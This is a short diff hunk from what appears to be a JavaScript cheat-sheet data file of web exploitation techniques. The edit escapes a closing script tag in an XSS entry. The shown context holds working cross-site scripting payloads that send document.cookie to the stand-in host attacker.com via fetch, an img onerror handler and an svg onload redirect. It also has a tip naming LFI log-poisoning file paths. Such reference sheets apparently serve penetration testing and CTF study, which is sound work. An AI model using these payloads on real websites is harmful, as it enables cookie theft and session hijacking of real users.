@@ -421,7 +421,7 @@ tags:['lfi','directory-traversal','rce','php'],diff:'intermediate',plat:'cross-p
 tip:'Try /proc/self/environ, /proc/self/fd/X, /var/log/auth.log for log poisoning alternatives.'},
 
 {cat:'web-exploitation',tool:'XSS',desc:'XSS payloads for cookie stealing and DOM-based injection',
-cmd:`<script>fetch('http://attacker.com/?c='+document.cookie)</script>
+cmd:`<script>fetch('http://attacker.com/?c='+document.cookie)<\/script>
 <img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
 <svg onload="document.location='http://attacker.com/?c='+document.cookie">
 # DOM XSS:
